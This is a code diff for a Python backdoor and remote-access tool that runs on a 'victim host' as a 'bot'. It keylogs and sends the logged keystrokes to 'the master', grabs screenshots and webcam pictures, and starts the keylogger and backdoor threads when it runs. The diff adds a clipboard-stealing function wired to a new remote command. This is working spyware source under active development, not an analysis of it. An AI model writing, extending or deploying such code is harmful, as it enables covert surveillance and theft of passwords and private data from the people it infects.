@@ -12,6 +12,7 @@ import subprocess
 import os
 import tempfile
 import threading
+import pyperclip
 from time import sleep
 from base64 import b64encode, b64decode
 from filecmp import cmp
@@ -235,7 +236,7 @@ def keylogs_stop():
 
 
 def keylogs_download():
-    """Send keylogged data to the master and delete it from victim host.\n"""
+    """Sends keylogged data to the master and delete it from victim host.\n"""
     try:
         with open(keylogfile, 'rb') as f_kd:
             keylogged_data = b64decode(f_kd.read()).decode('utf-8')
@@ -253,6 +254,7 @@ def keylogs_download():
 
 # TODO: Test on Windows
 def screenshot():
+    """Takes a screenshot of bot's monitors and sends it to the master.\n"""
     buffer = BytesIO()
     try:
         im = ImageGrab.grab()
@@ -264,8 +266,10 @@ def screenshot():
         sender('reachedexcept')
         sender(str(exception))
 
+
 # TODO: Test on Windows
 def webcam_pic():
+    """Takes a picture with bot's webcam and sends it to the master.\n"""
     try:
         video_capture = cv2.VideoCapture(0)
         # Check success
@@ -283,6 +287,15 @@ def webcam_pic():
             sender('Can\'t access any webcam!')
     except Exception as exception:
         sender('reachedexcept')
+        sender(str(exception))
+
+
+# TODO: Test on Windows
+def clip_copy():
+    """Sends bot's clipboard content to the master.\n"""
+    try:
+        sender('Clipboard content:\n' + pyperclip.paste())
+    except Exception as exception:
         sender(str(exception))
 
 
@@ -491,6 +504,8 @@ def backdoor():
                         screenshot()
                     elif received_command == 'SHwebcampic':
                         webcam_pic()
+                    elif received_command == 'SHclipboard':
+                        clip_copy()
                     elif received_command == 'SHkeylogstatus':
                         keylogs_status()
                     elif received_command == 'SHkeylogstart':
@@ -541,6 +556,4 @@ thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start(
 # Backdoor's thread
 thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
-# TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
-# TODO: Add active window recognition
 # TODO: Add Webcam stream and microphone
